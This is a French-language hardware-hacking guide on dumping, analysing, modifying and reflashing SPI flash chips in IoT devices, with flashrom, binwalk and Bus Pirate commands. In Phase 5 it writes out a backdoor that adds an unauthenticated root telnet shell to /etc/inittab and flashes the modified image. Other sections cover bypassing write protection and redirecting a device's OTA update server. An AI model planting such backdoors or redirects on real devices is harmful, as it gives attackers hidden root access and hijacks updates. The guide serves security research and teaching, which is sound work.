---
name: iot-spi-flash
title: "SPI Flash IoT — Dump, Analyse et Manipulation"
description: "Guide complet pour l'identification, l'extraction, l'analyse et la réécriture de mémoires flash SPI sur les dispositifs IoT. Couvre les protocoles SPI, les chipsets de flash courants, le dumping en circuit et hors circuit, les protections de lecture, et la modification de firmware."
category: cybersecurite
---

# SPI Flash IoT — Dump, Analyse et Manipulation

## Vue d'Ensemble

Les mémoires flash SPI (Serial Peripheral Interface) sont le support de stockage principal pour la plupart des dispositifs IoT : firmware, configuration, données utilisateur. L'accès physique à la flash permet d'extraire le firmware même si toutes les protections logicielles sont actives.

### Objectifs
- Identifier la flash (marquage, datasheet, pinout)
- Dumper le contenu (en circuit / hors circuit)
- Analyser la structure (partitions, filesystem, configuration)
- Modifier le firmware et reflasher
- Contourner les protections de lecture (RP, OTP, BP)
- Cloner / dupliquer des dispositifs

---

## Outils Essentiels

### Programmateurs Hardware
| Outil | Bus supporté | Prix |
|-------|-------------|------|
| **CH341A** | SPI, I²C, EEPROM | ~$5 — programmateur chinois, abordable mais instable |
| **FT232H** | SPI, JTAG, I²C, UART | ~$25 — stable, MPSSE, openocd |
| **Bus Pirate v4/v6** | SPI, I²C, 1-Wire, JTAG | ~$30 — universel, idéal test |
| **TL866II / T48** | Multi (SPI, parallele, PLCC) | ~$60 — programmateur universel |
| **DediProg SF100/6000** | SPI, I²C (production) | ~$500 — professionnel, support large |
| **Raspberry Pi** | SPI via GPIO | ~$0 (si déjà possédé) — via flashrom |

### Pinces et Adaptateurs
| Accessoire | Usage |
|------------|-------|
| **SOIC-8 clip (Pomona 5250)** | Connection sur flash soudée (sans dessoudure) |
| **SOIC-8 test socket** | Pour flash dessoudée |
| **SOIC-16 / SOP-16 clip** | Flash plus grandes |
| **WSON-8 adapter** | Flash sans pin (type package) |
| **Pogo pins** | Pour pads de test sans connecteur |

### Logiciels
| Outil | Usage |
|-------|-------|
| `flashrom` | Standard : dump, erase, write, verify (supporte 500+ chips) |
| `esptool` | ESP8266/ESP32 via SPI |
| `ch341prog` | Programmation CH341A |
| `spi_flash` / `flash_interface` | Scripts Python pour protocole SPI |
| `chipsec` | Extraction SPI flash depuis l'OS (x86) |
| `binwalk` | Analyse du dump extrait |
| `hexdump` / `xxd` | Visualisation hexadécimale |
| `strings` | Extraction de chaînes |

---

## Méthodologie

### Phase 1 : Identification du Composant

```bash
# Lire les marquages sur le composant
# Les flash SPI sont généralement en package SOIC-8 (208 mil)
# Marquages typiques :
#   25Qxx — Winbond (W25Q64, W25Q128)
#   MX25Lxx — Macronix
#   GD25Qxx — GigaDevice
#   S25FLxx — Cypress / Infineon
#   N25Qxx — Micron
#   IS25LPxx — ISSI
#   AT25SFxx — Adesto (Dialog)

# Une fois identifié, chercher la datasheet :
# "W25Q128JV datasheet" → documentation technique
# Points clés à noter :
# - Taille de la flash (64Mbit = 8MB, 128Mbit = 16MB)
# - Tension d'alimentation (3.3V ou 1.8V)
# - Sécurité : Block Protect, OTP, Security Register, SRP
```

### Phase 2 : Pinout et Connexion

#### Pinout SOIC-8 Standard
```
    ┌──────┐
 CS │1  8  │ VCC
    │      │
MISO│2  7  │ /HOLD (ou WP)
    │      │
 WP │3  6  │ CLK
    │      │
 GND│4  5  │ MOSI
    └──────┘
```

#### Connexion avec SOIC-8 Clip (Pomona 5250)
```
# Couleurs standard des fils Pomona 5250
# Rouge → VCC (3.3V)
# Noir → GND
# Jaune → CS
# Vert → MISO (DO)
# Bleu → MOSI (DI)
# Blanc → CLK
# Orange → WP
# Violet → HOLD
```

#### Connexion avec CH341A
```bash
# CH341A en mode SPI :
# Pin 1 (CS) → CS de la flash
# Pin 2 (DO) → MISO
# Pin 5 (DI) → MOSI
# Pin 6 (CLK) → CLK
# Alimentation de la flash via CH341A (3.3V) ou externe
```

### Phase 3 : Dumping avec flashrom

```bash
# 1. Détection du chip
flashrom -p ch341a_spi

# 2. Dump complet
flashrom -p ch341a_spi -r firmware.bin

# 3. Vérification (dump deux fois, comparer)
flashrom -p ch341a_spi -r verify1.bin
flashrom -p ch341a_spi -r verify2.bin
md5sum verify1.bin verify2.bin
# Doivent être identiques sinon problème de connexion

# 4. Avec FT232H
flashrom -p ft232h_spi:type=2232H,port=A -r firmware.bin

# 5. Avec Raspberry Pi
# Connecter : SPI1 (CS0, MISO, MOSI, SCLK) + GND + 3.3V
flashrom -p linux_spi:dev=/dev/spidev0.0 -r firmware.bin

# 6. Dump partiel (offset + size)
flashrom -p ch341a_spi -r partition.bin -l 0x100000 -i 0x0
```

### Phase 4 : Analyse du Dump

```bash
# 1. Structure du dump
binwalk firmware.bin
# Chercher : u-boot, kernel, rootfs, squashfs, jffs2, ubifs

# 2. Entropie
binwalk -E firmware.bin

# 3. Extraction des partitions
binwalk -Me firmware.bin

# 4. Analyse des strings
strings firmware.bin | grep -iE '(admin|password|key|token|secret|http|https|api)'

# 5. Analyse hexadécimale
xxd firmware.bin | head -100
# Rechercher des headers de partition, des signatures
```

### Phase 5 : Modification et Reflash

```bash
# 1. Extraire une partition
# SquashFS
dd if=firmware.bin of=rootfs.squashfs bs=1 skip=$OFFSET count=$SIZE
unsquashfs rootfs.squashfs

# 2. Modifier (exemple : ajouter une backdoor dans /etc/inittab)
echo "ttyS0::respawn:/usr/sbin/telnetd -l /bin/sh" >> squashfs-root/etc/inittab

# 3. Recompresser
mksquashfs squashfs-root/ rootfs_new.squashfs -comp xz

# 4. Remplacer dans l'image firmware
dd if=rootfs_new.squashfs of=firmware_backdoored.bin bs=1 seek=$OFFSET conv=notrunc

# 5. Effacer et reflasher
flashrom -p ch341a_spi -E
flashrom -p ch341a_spi -w firmware_backdoored.bin

# 6. Vérifier
flashrom -p ch341a_spi -v firmware_backdoored.bin
```

---

## Techniques Avancées

### Bypass de Block Protect (BP0, BP1, BP2, BP3)
```bash
# La flash a des bits de protection dans le Status Register
# Format SR (W25Q) : BP[3:0] définissent la zone protégée

# Déverrouillage complet :
flashrom -p ch341a_spi --wp-disable

# Si le software lock ne suffit pas :
# 1. Modifier le Status Register en direct
#    Commande : 01h (Write Enable) + 01h (Write Status Register)
#    Avec Bus Pirate :
spi
[0x06]   # Write Enable
[0x01 0x00]  # Write Status Register (put 0 = tout déprotéger)

# 2. Si SRP (Status Register Protect) est actif :
#    - Besoin d'une commande spéciale (selon chip)
#    - Ou glitching pendant la lecture du SR
#    - Ou effacement complet (mass erase) qui reset tout
```

### Bypass de OTP (One-Time Programmable)
```bash
# Certaines flashes ont des secteurs OTP verrouillés définitivement
# Contournement :
# 1. Lire le Security Register (commande 2Bh/48h)
# 2. Si OTP est un secteur séparé, le dump est possible
# 3. Si le lock est hardware, pas de bypass (remplacement de la flash)
```

### Dumping pendant le Boot (Bootloader Bypass)
```bash
# Si le bootloader verrouille la flash au démarrage :
# 1. Connecter les probes AVANT la mise sous tension
# 2. Démarrer le dump avec flashrom EN MÊME TEMPS que le boot
# La fenêtre avant le verrouillage est parfois assez large (< 100ms)
# Utiliser un trigger de reset :
flashrom -p ch341a_spi -r dump.bin &
# immédiatement après, alimenter la cible
```

### Attaque sur Configuration / NVRAM
```bash
# Beaucoup de devices stockent la config dans la même flash
# Modifier directement les bytes en hex :
# - Mot de passe admin hashé
# - URL du serveur OTA (redirection vers notre serveur)
# - Certificat TLS (self-signed)
# - Paramètres réseau (DNS, gateway)
```

### Dump de Flash Multi-Die (Stacked)
```bash
# Certaines flash sont empilées (2 dies dans 1 package)
# Identifiables par le Chip ID (RDID, 9Fh) qui retourne 2 IDs
# flashrom peut ne pas les gérer → utiliser des scripts custom
# Changer le CS (Chip Select) pour accéder au deuxième die
```

---

## Pièges & ASTUCES

⚠️ **Alimentation de la flash** : le CH341A fournit 3.3V mais peut être instable. Si la flash est en circuit, préférer alimenter via le device (éviter les conflits avec les autres composants du bus)
⚠️ **Connexion en circuit** : d'autres composants peuvent être sur le même bus SPI et interférer. Si le dump est corrompu, dessouder la flash
⚠️ **SOIC-8 clip** : fragile, les pinces se déforment. Vérifier la connexion avec un multimètre (continuité pin → pad)
⚠️ **WP / HOLD** : si ces pins flottent, la flash peut refuser d'écrire. Les puller à VCC
⚠️ **Tension** : vérifier 1.8V vs 3.3V. Les flash 1.8V grillent avec un CH341A en 3.3V
⚠️ **Bus Pirate en SPI** : alimentation limitée (50mA). Si le device consomme plus, alimentation externe
⚠️ **Erase avant Write** : flashrom fait un erase automatique, mais si le chip est bloqué, l'erase peut échouer
⚠️ **Dump corrompu** : si le dump a des 0xFF partout, la connexion SPI est mauvaise (CS, MISO, MOSI) ou la flash est vide/effacée
⚠️ **Flash vierge** : 0xFF partout = flash effacée ou jamais programmée

### Check-list Rapide
```bash
# 1. Identifier le chip
# 2. Connecter le programmateur
# 3. Détecter avec flashrom
flashrom -p ch341a_spi

# 4. Dump + vérification
flashrom -p ch341a_spi -r dump1.bin
flashrom -p ch341a_spi -r dump2.bin
diff dump1.bin dump2.bin || echo "PROBLÈME DE CONNEXION"

# 5. Analyser
binwalk dump1.bin

# 6. Si modifications, sauvegarder l'original d'abord !
```

---

## Références

- **flashrom** : https://flashrom.org/Flashrom
- **Winbond W25Qxx Datasheets** : https://www.winbond.com/hq/product/code-storage-flash-memory/
- **CH341A Programming** : https://github.com/karlyashkey/ch341prog
- **Bus Pirate SPI Guide** : http://dangerousprototypes.com/docs/Bus_Pirate#SPI
- **SPI Flash Protocol** : https://www.sigun.com/wp-content/uploads/2015/10/SPI_Flash_Commands.pdf
- **The Hardware Hacking Handbook** : Ch 8 (SPI Flash)